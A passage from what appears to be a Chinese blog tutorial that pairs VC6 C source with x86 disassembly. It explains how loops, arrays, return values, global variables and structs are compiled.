&#125;while(i&lt;10);</span><br><span class="line">00401049   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">0040104D   jl          main+1Fh (0040102f)</span><br></pre></td></tr></table></figure><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1:        int i = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        while(i&lt;10)&#123;</span><br><span class="line">0040102F   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">00401033   jge         main+41h (00401051)</span><br><span class="line">3:            printf(&quot;%d&quot;,i);</span><br><span class="line">00401035   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401038   push        eax</span><br><span class="line">00401039   push        offset string &quot;%d&quot; (0042201c)</span><br><span class="line">0040103E   call        printf (0040d690)</span><br><span class="line">00401043   add         esp,8</span><br><span class="line">4:           i++;</span><br><span class="line">00401046   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401049   add         ecx,1</span><br><span class="line">0040104C   mov         dword ptr [ebp-4],ecx</span><br><span class="line">5:       &#125;</span><br><span class="line">0040104F   jmp         main+1Fh (0040102f)</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:        for(int i=1; i&lt;10; i++)&#123;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">0040102F   jmp         main+2Ah (0040103a)</span><br><span class="line">00401031   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401034   add         eax,1</span><br><span class="line">00401037   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040103A   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">0040103E   jge         main+43h (00401053)</span><br><span class="line">2:            printf(&quot;%d&quot;,i);</span><br><span class="line">00401040   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401043   push        ecx</span><br><span class="line">00401044   push        offset string &quot;%d&quot; (0042201c)</span><br><span class="line">00401049   call        printf (0040d690)</span><br><span class="line">0040104E   add         esp,8</span><br><span class="line">3:        &#125;</span><br><span class="line">00401051   jmp         main+21h (00401031)</span><br></pre></td></tr></table></figure><br><h1 id="0x06-数组"><a href="#0x06-数组" class="headerlink" title="0x06 数组"></a>0x06 数组</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0040D490   push        ebp</span><br><span class="line">0040D491   mov         ebp,esp</span><br><span class="line">0040D493   sub         esp,60h</span><br><span class="line">0040D496   push        ebx</span><br><span class="line">0040D497   push        esi</span><br><span class="line">0040D498   push        edi</span><br><span class="line">0040D499   lea         edi,[ebp-60h]</span><br><span class="line">0040D49C   mov         ecx,18h</span><br><span class="line">0040D4A1   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D4A6   rep stos    dword ptr [edi]</span><br><span class="line">1:        int a[7] = &#123;0,1,2,3,4,5,6&#125;;</span><br><span class="line">00401028   mov         dword ptr [ebp-1Ch],0</span><br><span class="line">0040102F   mov         dword ptr [ebp-18h],1</span><br><span class="line">00401036   mov         dword ptr [ebp-14h],2</span><br><span class="line">0040103D   mov         dword ptr [ebp-10h],3</span><br><span class="line">00401044   mov         dword ptr [ebp-0Ch],4</span><br><span class="line">0040104B   mov         dword ptr [ebp-8],5</span><br><span class="line">00401052   mov         dword ptr [ebp-4],6</span><br><span class="line">2:        int b = a[0];</span><br><span class="line">00401059   mov         eax,dword ptr [ebp-1Ch]</span><br><span class="line">0040105C   mov         dword ptr [ebp-20h],eax</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0040D490   push        ebp</span><br><span class="line">0040D491   mov         ebp,esp</span><br><span class="line">0040D493   sub         esp,4Ch</span><br><span class="line">0040D496   push        ebx</span><br><span class="line">0040D497   push        esi</span><br><span class="line">0040D498   push        edi</span><br><span class="line">0040D499   lea         edi,[ebp-4Ch]</span><br><span class="line">0040D49C   mov         ecx,13h</span><br><span class="line">0040D4A1   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D4A6   rep stos    dword ptr [edi]</span><br><span class="line">1:       char a[7]=&#123;0,1,2,3,4,5,6&#125;;</span><br><span class="line">00401078   mov         byte ptr [ebp-8],0</span><br><span class="line">0040107C   mov         byte ptr [ebp-7],1</span><br><span class="line">00401080   mov         byte ptr [ebp-6],2</span><br><span class="line">00401084   mov         byte ptr [ebp-5],3</span><br><span class="line">00401088   mov         byte ptr [ebp-4],4</span><br><span class="line">0040108C   mov         byte ptr [ebp-3],5</span><br><span class="line">00401090   mov         byte ptr [ebp-2],6</span><br><span class="line">2:       char b = a[0];</span><br><span class="line">00401094   mov         al,byte ptr [ebp-8]</span><br><span class="line">00401097   mov         byte ptr [ebp-0Ch],al</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:        int b[5] = &#123;0&#125;;</span><br><span class="line">00401038   mov         dword ptr [ebp-14h],0</span><br><span class="line">0040103F   xor         eax,eax</span><br><span class="line">00401041   mov         dword ptr [ebp-10h],eax</span><br><span class="line">00401044   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">00401047   mov         dword ptr [ebp-8],eax</span><br><span class="line">0040104A   mov         dword ptr [ebp-4],eax</span><br><span class="line">; 再多一点会用stos循环</span><br></pre></td></tr></table></figure><p><strong>数组最重要的特点是等宽且连续</strong>，如果不是等宽的则很有可能是个结构体。</p><p>注意一下分配的缓冲区</p><p>如果有疑惑去写代码放到od里看，看看内存绝对就懂了。</p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">1:    int main(int argc, char* argv[])</span><br><span class="line">2:    &#123;</span><br><span class="line">0040D6F0   push        ebp</span><br><span class="line">0040D6F1   mov         ebp,esp</span><br><span class="line">0040D6F3   sub         esp,78h</span><br><span class="line">0040D6F6   push        ebx</span><br><span class="line">0040D6F7   push        esi</span><br><span class="line">0040D6F8   push        edi</span><br><span class="line">0040D6F9   lea         edi,[ebp-78h]</span><br><span class="line">0040D6FC   mov         ecx,1Eh</span><br><span class="line">0040D701   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D706   rep stos    dword ptr [edi]</span><br><span class="line">3:        int a[3][4] = &#123;</span><br><span class="line">4:            &#123;1,2,3,4&#125;,</span><br><span class="line">0040D708   mov         dword ptr [ebp-30h],1</span><br><span class="line">0040D70F   mov         dword ptr [ebp-2Ch],2</span><br><span class="line">0040D716   mov         dword ptr [ebp-28h],3</span><br><span class="line">0040D71D   mov         dword ptr [ebp-24h],4</span><br><span class="line">5:           &#123;5,6,7,8&#125;,</span><br><span class="line">0040D724   mov         dword ptr [ebp-20h],5</span><br><span class="line">0040D72B   mov         dword ptr [ebp-1Ch],6</span><br><span class="line">0040D732   mov         dword ptr [ebp-18h],7</span><br><span class="line">0040D739   mov         dword ptr [ebp-14h],8</span><br><span class="line">6:           &#123;9,10,11,12&#125;</span><br><span class="line">0040D740   mov         dword ptr [ebp-10h],9</span><br><span class="line">0040D747   mov         dword ptr [ebp-0Ch],0Ah</span><br><span class="line">0040D74E   mov         dword ptr [ebp-8],0Bh</span><br><span class="line">0040D755   mov         dword ptr [ebp-4],0Ch</span><br><span class="line">7:       &#125;;</span><br><span class="line">8:       for (int i = 0; i&lt;3; i++)&#123;</span><br><span class="line">0040D75C   mov         dword ptr [ebp-34h],0</span><br><span class="line">0040D763   jmp         main+7Eh (0040d76e)</span><br><span class="line">0040D765   mov         eax,dword ptr [ebp-34h]</span><br><span class="line">0040D768   add         eax,1</span><br><span class="line">0040D76B   mov         dword ptr [ebp-34h],eax</span><br><span class="line">0040D76E   cmp         dword ptr [ebp-34h],3</span><br><span class="line">0040D772   jge         main+0BEh (0040d7ae)</span><br><span class="line">9:           for(int b = 0; b&lt;4; b++)&#123;</span><br><span class="line">0040D774   mov         dword ptr [b],0</span><br><span class="line">0040D77B   jmp         main+96h (0040d786)</span><br><span class="line">0040D77D   mov         ecx,dword ptr [b]</span><br><span class="line">0040D780   add         ecx,1</span><br><span class="line">0040D783   mov         dword ptr [b],ecx</span><br><span class="line">0040D786   cmp         dword ptr [b],4</span><br><span class="line">0040D78A   jge         main+0BCh (0040d7ac)</span><br><span class="line">10:               printf(&quot;%d &quot;,a[i][b]);</span><br><span class="line">0040D78C   mov         edx,dword ptr [ebp-34h]</span><br><span class="line">0040D78F   shl         edx,4</span><br><span class="line">0040D792   lea         eax,[ebp+edx-30h]</span><br><span class="line">0040D796   mov         ecx,dword ptr [b]</span><br><span class="line">0040D799   mov         edx,dword ptr [eax+ecx*4]</span><br><span class="line">0040D79C   push        edx</span><br><span class="line">0040D79D   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D7A2   call        printf (00401060)</span><br><span class="line">0040D7A7   add         esp,8</span><br><span class="line">11:           &#125;</span><br><span class="line">0040D7AA   jmp         main+8Dh (0040d77d)</span><br><span class="line">12:       &#125;</span><br><span class="line">0040D7AC   jmp         main+75h (0040d765)</span><br><span class="line">13:</span><br><span class="line">14:   &#125;</span><br><span class="line">0040D7AE   pop         edi</span><br><span class="line">0040D7AF   pop         esi</span><br><span class="line">0040D7B0   pop         ebx</span><br><span class="line">0040D7B1   add         esp,78h</span><br><span class="line">0040D7B4   cmp         ebp,esp</span><br><span class="line">0040D7B6   call        __chkesp (004010e0)</span><br><span class="line">0040D7BB   mov         esp,ebp</span><br><span class="line">0040D7BD   pop         ebp</span><br><span class="line">0040D7BE   ret</span><br></pre></td></tr></table></figure><br><h1 id="0x07-返回值"><a href="#0x07-返回值" class="headerlink" title="0x07 返回值"></a>0x07 返回值</h1><h2 id="char类型"><a href="#char类型" class="headerlink" title="char类型"></a>char类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; a函数</span><br><span class="line">1:        char a = 0x12;</span><br><span class="line">00401038   mov         byte ptr [ebp-4],12h</span><br><span class="line">2:        return a;</span><br><span class="line">0040103C   mov         al,byte ptr [ebp-4]</span><br><span class="line">; main函数</span><br><span class="line">3:       char b=a();</span><br><span class="line">00401078   call        @ILT+10(a) (0040100f)</span><br><span class="line">0040107D   mov         byte ptr [ebp-4],al</span><br></pre></td></tr></table></figure><h2 id="int类型"><a href="#int类型" class="headerlink" title="int类型"></a>int类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; a函数</span><br><span class="line">1:        int a = 0x12345678;</span><br><span class="line">00401038   mov         dword ptr [ebp-4],12345678h</span><br><span class="line">2:        return a;</span><br><span class="line">0040103F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">; main函数</span><br><span class="line">3:       int b=a();</span><br><span class="line">00401078   call        @ILT+0(a) (00401005)</span><br><span class="line">0040107D   mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure><h2 id="long-long"><a href="#long-long" class="headerlink" title="long long"></a>long long</h2><p>__int64就是vc6的long long类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; a函数</span><br><span class="line">1:        __int64 a = 0x12345678;</span><br><span class="line">00401038   mov         dword ptr [ebp-8],12345678h</span><br><span class="line">0040103F   mov         dword ptr [ebp-4],0</span><br><span class="line">2:        return a;</span><br><span class="line">00401046   mov         eax,dword ptr [ebp-8]</span><br><span class="line">00401049   mov         edx,dword ptr [ebp-4]</span><br><span class="line">; main函数</span><br><span class="line">3:       __int64 b=a();</span><br><span class="line">00401078   call        @ILT+20(a) (00401019)</span><br><span class="line">0040107D   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401080   mov         dword ptr [ebp-4],edx</span><br></pre></td></tr></table></figure><p>高位存在edx，低位存在eax。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><ul><li>就算宽度小于四字节（char），也会把值存在四字节中。</li><li>如果有疑惑去写代码放到od里看，看看内存绝对就懂了。</li><li>char类型或者short类型的参数没有节省空间，整数类型的参数，一律使用int类型。</li></ul><br><h1 id="0x08-全局变量"><a href="#0x08-全局变量" class="headerlink" title="0x08 全局变量"></a>0x08 全局变量</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:    int a = 21;</span><br><span class="line">2:</span><br><span class="line">3:    int main(int argc, char* argv[])</span><br><span class="line">4:    &#123;</span><br><span class="line">0040D6F0   push        ebp</span><br><span class="line">0040D6F1   mov         ebp,esp</span><br><span class="line">0040D6F3   sub         esp,40h</span><br><span class="line">0040D6F6   push        ebx</span><br><span class="line">0040D6F7   push        esi</span><br><span class="line">0040D6F8   push        edi</span><br><span class="line">0040D6F9   lea         edi,[ebp-40h]</span><br><span class="line">0040D6FC   mov         ecx,10h</span><br><span class="line">0040D701   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D706   rep stos    dword ptr [edi]</span><br><span class="line">5:        a = 22;</span><br><span class="line">0040D708   mov         dword ptr [a (00424d8c)],16h</span><br></pre></td></tr></table></figure><p>全局变量在程序编译完成后地址就已经确定下来了</p><br><h1 id="0x09-结构体"><a href="#0x09-结构体" class="headerlink" title="0x09 结构体"></a>0x09 结构体</h1><h2 id="定义全局变量（基值）"><a href="#定义全局变量（基值）" class="headerlink" title="定义全局变量（基值）"></a>定义全局变量（基值）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">; 结构体</span><br><span class="line">1:    struct SOS</span><br><span class="line">2:    &#123;</span><br><span class="line">3:        int a;</span><br><span class="line">4:        short b;</span><br><span class="line">5:        char c;</span><br><span class="line">6:   &#125;;</span><br><span class="line">7:   SOS x;</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">8:   int main()&#123;</span><br><span class="line">004109D0   push        ebp</span><br><span class="line">004109D1   mov         ebp,esp</span><br><span class="line">004109D3   sub         esp,40h</span><br><span class="line">004109D6   push        ebx</span><br><span class="line">004109D7   push        esi</span><br><span class="line">004109D8   push        edi</span><br><span class="line">004109D9   lea         edi,[ebp-40h]</span><br><span class="line">004109DC   mov         ecx,10h</span><br><span class="line">004109E1   mov         eax,0CCCCCCCCh</span><br><span class="line">004109E6   rep stos    dword ptr [edi]</span><br><span class="line">9:       fun();</span><br><span class="line">004109E8   call        @ILT+15(fun) (00401014)</span><br><span class="line">10:       fun2();</span><br><span class="line">004109ED   call        @ILT+10(fun) (0040100f)</span><br><span class="line">11:       return 0;</span><br><span class="line">004109F2   xor         eax,eax</span><br><span class="line">12:   &#125;</span><br><span class="line">004109F4   pop         edi</span><br><span class="line">004109F5   pop         esi</span><br><span class="line">004109F6   pop         ebx</span><br><span class="line">004109F7   add         esp,40h</span><br><span class="line">004109FA   cmp         ebp,esp</span><br><span class="line">004109FC   call        __chkesp (004106a0)</span><br><span class="line">00410A01   mov         esp,ebp</span><br><span class="line">00410A03   pop         ebp</span><br><span class="line">00410A04   ret</span><br><span class="line"></span><br><span class="line">; fun函数</span><br><span class="line">13:   void fun()</span><br><span class="line">14:   &#123;</span><br><span class="line">004106E0   push        ebp</span><br><span class="line">004106E1   mov         ebp,esp</span><br><span class="line">004106E3   sub         esp,40h</span><br><span class="line">004106E6   push        ebx</span><br><span class="line">004106E7   push        esi</span><br><span class="line">004106E8   push        edi</span><br><span class="line">004106E9   lea         edi,[ebp-40h]</span><br><span class="line">004106EC   mov         ecx,10h</span><br><span class="line">004106F1   mov         eax,0CCCCCCCCh</span><br><span class="line">004106F6   rep stos    dword ptr [edi]</span><br><span class="line">15:       x.a = 1;</span><br><span class="line">004106F8   mov         dword ptr [x (0042c230)],1</span><br><span class="line">16:       x.b = 2;</span><br><span class="line">00410702   mov         word ptr [x+4 (0042c234)],offset fun+29h (00410709)</span><br><span class="line">17:       x.c = 3;</span><br><span class="line">0041070B   mov         byte ptr [x+6 (0042c236)],3</span><br><span class="line">18:   &#125;</span><br><span class="line">00410712   pop         edi</span><br><span class="line">00410713   pop         esi</span><br><span class="line">00410714   pop         ebx</span><br><span class="line">00410715   mov         esp,ebp</span><br><span class="line">00410717   pop         ebp</span><br><span class="line">00410718   ret</span><br><span class="line"></span><br><span class="line">; fun2函数</span><br><span class="line">19:   void fun2()&#123;</span><br><span class="line">00410630   push        ebp</span><br><span class="line">00410631   mov         ebp,esp</span><br><span class="line">00410633   sub         esp,40h</span><br><span class="line">00410636   push        ebx</span><br><span class="line">00410637   push        esi</span><br><span class="line">00410638   push        edi</span><br><span class="line">00410639   lea         edi,[ebp-40h]</span><br><span class="line">0041063C   mov         ecx,10h</span><br><span class="line">00410641   mov         eax,0CCCCCCCCh</span><br><span class="line">00410646   rep stos    dword ptr [edi]</span><br><span class="line">20:       printf(&quot;%d,%d,%d&quot;,x.a,x.b,x.c);</span><br><span class="line">00410648   movsx       eax,byte ptr [x+6 (0042c236)]</span><br><span class="line">0041064F   push        eax</span><br><span class="line">00410650   movsx       ecx,word ptr [x+4 (0042c234)]</span><br><span class="line">00410657   push        ecx</span><br><span class="line">00410658   mov         edx,dword ptr [x (0042c230)]</span><br><span class="line">0041065E   push        edx</span><br><span class="line">0041065F   push        offset string &quot;%d,%d,%d&quot; (00427004)</span><br><span class="line">00410664   call        printf (00410950)</span><br><span class="line">00410669   add         esp,10h</span><br><span class="line">21:   &#125;</span><br><span class="line">0041066C   pop         edi</span><br><span class="line">0041066D   pop         esi</span><br><span class="line">0041066E   pop         ebx</span><br><span class="line">0041066F   add         esp,40h</span><br><span class="line">00410672   cmp         ebp,esp</span><br><span class="line">00410674   call        __chkesp (004106a0)</span><br><span class="line">00410679   mov         esp,ebp</span><br><span class="line">0041067B   pop         ebp</span><br><span class="line">0041067C   ret</span><br></pre></td></tr></table></figure><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; fun函数</span><br><span class="line">; x变成局部变量</span><br><span class="line">1:   &#123;</span><br><span class="line">004106E0   push        ebp</span><br><span class="line">004106E1   mov         ebp,esp</span><br><span class="line">004106E3   sub         esp,48h</span><br><span class="line">004106E6   push        ebx</span><br><span class="line">004106E7   push        esi</span><br><span class="line">004106E8   push        edi</span><br><span class="line">004106E9   lea         edi,[ebp-48h]</span><br><span class="line">004106EC   mov         ecx,12h</span><br><span class="line">004106F1   mov         eax,0CCCCCCCCh</span><br><span class="line">004106F6   rep stos    dword ptr [edi]</span><br><span class="line">2:       SOS x;</span><br><span class="line">3:       x.a = 1;</span><br><span class="line">004106F8   mov         dword ptr [ebp-8],1</span><br><span class="line">4:       x.b = 2;</span><br><span class="line">004106FF   mov         word ptr [ebp-4],offset fun+23h (00410703)</span><br><span class="line">5:       x.c = 3;</span><br><span class="line">00410705   mov         byte ptr [ebp-2],3</span><br><span class="line">6:   &#125;</span><br></pre></td></tr></table></figure><h2 id="函数返回（参数较少）（没超过两字节）"><a href="#函数返回（参数较少）（没超过两字节）" class="headerlink" title="函数返回（参数较少）（没超过两字节）"></a>函数返回（参数较少）（没超过两字节）</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AAA</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">AAA <span class="title">fff</span><span class="params">(AAA d)</span></span>&#123;</span><br><span class="line">    d.a = <span class="number">1</span>;</span><br><span class="line">    d.b = <span class="number">2</span>;</span><br><span class="line">    d.c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    AAA e;</span><br><span class="line">    <span class="built_in">fff</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">; main函数</span><br><span class="line">1:       AAA e;</span><br><span class="line">2:       fff(e);</span><br><span class="line">0040D708   mov         eax,dword ptr [ebp-4];bc</span><br><span class="line">0040D70B   push        eax</span><br><span class="line">0040D70C   mov         ecx,dword ptr [ebp-8];a</span><br><span class="line">0040D70F   push        ecx</span><br><span class="line">0040D710   call        @ILT+5(fff) (0040100a)</span><br><span class="line">0040D715   add         esp,8</span><br><span class="line">0040D718   mov         dword ptr [ebp-10h],eax</span><br><span class="line">0040D71B   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line"></span><br><span class="line">; AAA</span><br><span class="line">3:    struct AAA&#123;</span><br><span class="line">4:        int a;</span><br><span class="line">5:        short b;</span><br><span class="line">6:        char c;</span><br><span class="line">7:   &#125;;</span><br><span class="line">8:   AAA fff(AAA d)&#123;</span><br><span class="line">00401010   push        ebp</span><br><span class="line">00401011   mov         ebp,esp</span><br><span class="line">00401013   sub         esp,40h</span><br><span class="line">00401016   push        ebx</span><br><span class="line">00401017   push        esi</span><br><span class="line">00401018   push        edi</span><br><span class="line">00401019   lea         